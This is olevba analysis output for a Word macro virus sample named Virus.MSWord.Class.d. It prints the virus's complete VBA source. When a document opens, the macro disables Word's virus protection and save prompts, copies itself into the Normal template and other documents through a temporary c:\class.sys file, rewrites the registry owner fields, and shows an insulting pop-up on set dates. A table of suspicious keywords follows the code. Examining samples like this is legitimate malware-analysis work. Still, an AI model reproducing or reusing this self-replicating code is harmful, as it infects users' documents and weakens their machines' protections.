olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-cfd7cd20a0f38cb96e11d15143a1cf159c42d13d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Extra.cls 
in file: Virus.MSWord.Class.d-cfd7cd20a0f38cb96e11d15143a1cf159c42d13d - OLE stream: 'Macros/VBA/Extra'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
Const REG_SZ As Long = 1
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
Const HKEY_CURRENT_USER As Long = &H80000001
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
Sub AutoOpen()
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
On Error GoTo out
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
Options.VirusProtection = False
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
Options.SaveNormalPrompt = False
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
Options.ConfirmConversions = False
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
If nt > 70 And ad > 0 Then GoTo out
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
If nt < 70 Then
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
End If
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
host.codemodule.AddFromFile ("c:\class.sys")
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
With host.codemodule
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
    For x = 1 To 16
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
    .deletelines 1
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
    Next x
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
End With
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
If nt < 70 Then
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
    With host.codemodule
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
    .replaceline 1, "Sub AutoClose()"
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
    .replaceline 91, "Sub ToolsMacro()"
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
    For x = 70 To 81
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
        .deletelines 62
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
    Next x
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
    .replaceline 35, "    For x = 1 To 4"
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
    End With
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
End If
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
If nt < 70 Then
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
u = RegCloseKey(k)
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
End If
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
With host.codemodule
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
    For x = 2 To 104 Step 2
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
    Next x
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
End With
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
out:
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
End Sub
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
Sub ViewVBCode()
'Liga25,04,2003 9:08:16HP DeskJet 610C Series on LPT2:aprilis pirma lapa
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

